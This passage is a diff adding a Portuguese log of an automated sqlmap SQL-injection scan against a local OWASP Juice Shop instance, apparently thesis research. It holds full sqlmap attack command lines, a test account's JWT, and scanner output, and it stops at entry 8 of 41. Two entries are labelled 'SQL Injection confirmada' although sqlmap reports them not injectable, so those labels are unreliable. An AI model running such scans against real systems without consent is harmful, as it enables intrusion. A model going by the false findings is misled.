@@ -1,0 +1,2359 @@
+================================================================================
+  SQLMAP - Teste Automatizado do OWASP Juice Shop
+  (NextGen B2B API + REST API)
+  Data:     2026-06-01 00:20:31
+  Base URL: http://localhost:3000
+  Level: 1 | Risk: 1
+  Token JWT: Sim
+  Total de endpoints: 41 (pulados: 0)
+================================================================================
+
+--------------------------------------------------------------------------------
+[1/41] Testando: b2b_create_order
+  Método:    POST
+  Path:      /b2b/v2/orders
+  Descrição: Criar pedido B2B (orderLines JSON)
+  Auth:      Sim (Bearer JWT)
+  Body:      {"cid": "JS0815DE", "orderLines": [{"productId": 8, "quantity": 500, "customerReference": "PO0000001"}]}
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/b2b/v2/orders" --method=POST --data='{"cid": "JS0815DE", "orderLines": [{"productId": 8, "quantity": 500, "customerReference": "PO0000001"}]}' --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4\nContent-Type: application/json"
+
+  [?] Resultado inconclusivo para b2b_create_order
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[,]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [']     | .'| . |
+  |___|_  [)]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:20:31 /2026-06-01/
+  
+  [00:20:31] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:20:31] [INFO] loading tamper module 'space2comment'
+  [00:20:31] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:20:31] [INFO] flushing session file
+  [00:20:31] [INFO] testing connection to the target URL
+  [00:20:31] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+  [00:20:31] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:20:32] [INFO] testing if the target URL content is stable
+  [00:20:32] [INFO] target URL content is stable
+  [00:20:32] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')
+  [00:20:32] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 3 times
+  
+  [*] ending @ 00:20:32 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[2/41] Testando: b2b_create_order_lines_data
+  Método:    POST
+  Path:      /b2b/v2/orders
+  Descrição: Criar pedido B2B (orderLinesData string)
+  Auth:      Sim (Bearer JWT)
+  Body:      {"cid": "JS0815DE", "orderLinesData": "[{\"productId\": 12,\"quantity\": 10000,\"customerReference\": [\"PO0000001.2\", \"SM20180105|042\"],\"couponCode\": \"pes[Bh.u*t\"},{\"productId\": 13,\"quantity\": 2000,\"customerReference\": \"PO0000003.4\"}]"}
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/b2b/v2/orders" --method=POST --data='{"cid": "JS0815DE", "orderLinesData": "[{\"productId\": 12,\"quantity\": 10000,\"customerReference\": [\"PO0000001.2\", \"SM20180105|042\"],\"couponCode\": \"pes[Bh.u*t\"},{\"productId\": 13,\"quantity\": 2000,\"customerReference\": \"PO0000003.4\"}]"}' --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4\nContent-Type: application/json"
+
+  [?] Resultado inconclusivo para b2b_create_order_lines_data
+
+  --- Saída do sqlmap ---
+  
+  A sintaxe do nome do arquivo, do nome do diret�rio ou do r�tulo do volume est� incorreta.
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[3/41] Testando: b2b_create_order_cid_only
+  Método:    POST
+  Path:      /b2b/v2/orders
+  Descrição: Criar pedido B2B (somente cid, teste de campo obrigatório)
+  Auth:      Sim (Bearer JWT)
+  Body:      {"cid": "TEST001BR"}
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/b2b/v2/orders" --method=POST --data='{"cid": "TEST001BR"}' --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4\nContent-Type: application/json"
+
+  [?] Resultado inconclusivo para b2b_create_order_cid_only
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[.]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [']     | .'| . |
+  |___|_  [,]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:20:32 /2026-06-01/
+  
+  [00:20:33] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:20:33] [INFO] loading tamper module 'space2comment'
+  [00:20:33] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:20:33] [INFO] flushing session file
+  [00:20:33] [INFO] testing connection to the target URL
+  [00:20:33] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+  [00:20:33] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:20:33] [INFO] testing if the target URL content is stable
+  [00:20:33] [INFO] target URL content is stable
+  [00:20:33] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')
+  [00:20:33] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 3 times
+  
+  [*] ending @ 00:20:33 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[4/41] Testando: rest_login
+  Método:    POST
+  Path:      /rest/user/login
+  Descrição: Login REST (email + password)
+  Auth:      Não
+  Body:      {"email": "admin@juice-sh.op", "password": "admin123"}
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/rest/user/login" --method=POST --data='{"email": "admin@juice-sh.op", "password": "admin123"}' --headers="Content-Type: application/json"
+
+  [?] Resultado inconclusivo para rest_login
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[)]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . ["]     | .'| . |
+  |___|_  [(]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:20:34 /2026-06-01/
+  
+  [00:20:34] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:20:34] [INFO] loading tamper module 'space2comment'
+  [00:20:34] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:20:34] [INFO] flushing session file
+  [00:20:34] [INFO] testing connection to the target URL
+  [00:20:34] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+  [00:20:34] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:20:34] [INFO] testing if the target URL content is stable
+  [00:20:35] [INFO] target URL content is stable
+  [00:20:35] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')
+  [00:20:35] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 3 times
+  
+  [*] ending @ 00:20:35 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[5/41] Testando: rest_login_inject
+  Método:    POST
+  Path:      /rest/user/login
+  Descrição: Login REST (teste de injeção via credenciais)
+  Auth:      Não
+  Body:      {"email": "test@test.com", "password": "test"}
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/rest/user/login" --method=POST --data='{"email": "test@test.com", "password": "test"}' --headers="Content-Type: application/json"
+
+  [?] Resultado inconclusivo para rest_login_inject
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[)]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [(]     | .'| . |
+  |___|_  [)]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:20:35 /2026-06-01/
+  
+  [00:20:35] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:20:35] [INFO] loading tamper module 'space2comment'
+  [00:20:35] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:20:35] [INFO] flushing session file
+  [00:20:35] [INFO] testing connection to the target URL
+  [00:20:35] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+  [00:20:35] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:20:35] [INFO] testing if the target URL content is stable
+  [00:20:36] [INFO] target URL content is stable
+  [00:20:36] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')
+  [00:20:36] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 3 times
+  
+  [*] ending @ 00:20:36 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[6/41] Testando: api_users_list
+  Método:    GET
+  Path:      /api/Users
+  Descrição: Listar todos os usuários
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Users" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em api_users_list
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[(]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [']     | .'| . |
+  |___|_  [']_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:20:36 /2026-06-01/
+  
+  [00:20:36] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:20:36] [INFO] loading tamper module 'space2comment'
+  [00:20:36] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:20:37] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:20:37] [INFO] flushing session file
+  [00:20:37] [INFO] testing connection to the target URL
+  [00:20:37] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:20:37] [INFO] testing if the target URL content is stable
+  [00:20:37] [INFO] target URL content is stable
+  [00:20:37] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:20:37] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:20:37] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:20:37] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:20:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:20:37] [WARNING] reflective value(s) found and filtering out
+  [00:20:37] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:20:37] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:20:38] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:20:38] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:20:38] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:20:38] [INFO] testing 'Generic inline queries'
+  [00:20:38] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:20:38] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:20:38] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:20:38] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:20:38] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:20:38] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:20:38] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:20:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:20:38] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:20:38] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:20:38] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 73 times
+  
+  [*] ending @ 00:20:38 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[7/41] Testando: api_users_get_by_id
+  Método:    GET
+  Path:      /api/Users/1
+  Descrição: Obter usuário por ID
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Users/1" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em api_users_get_by_id
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[']_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [)]     | .'| . |
+  |___|_  [)]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:20:39 /2026-06-01/
+  
+  [00:20:39] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:20:39] [INFO] loading tamper module 'space2comment'
+  [00:20:39] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:20:39] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:20:39] [INFO] flushing session file
+  [00:20:39] [INFO] testing connection to the target URL
+  [00:20:39] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:20:39] [INFO] testing if the target URL content is stable
+  [00:20:40] [INFO] target URL content is stable
+  [00:20:40] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:20:40] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:20:40] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:20:40] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:20:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:20:40] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:20:40] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:20:40] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:20:40] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:20:40] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:20:40] [INFO] testing 'Generic inline queries'
+  [00:20:41] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:20:41] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:20:41] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:20:41] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:20:41] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:20:41] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:20:41] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:20:41] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:20:41] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:20:41] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:20:41] [WARNING] HTTP error codes detected during run:
+  404 (Not Found) - 73 times
+  
+  [*] ending @ 00:20:41 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[8/41] Testando: api_users_get_large_id
+  Método:    GET
+  Path:      /api/Users/999999
+  Descrição: Obter usuário com ID grande (teste path param)
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
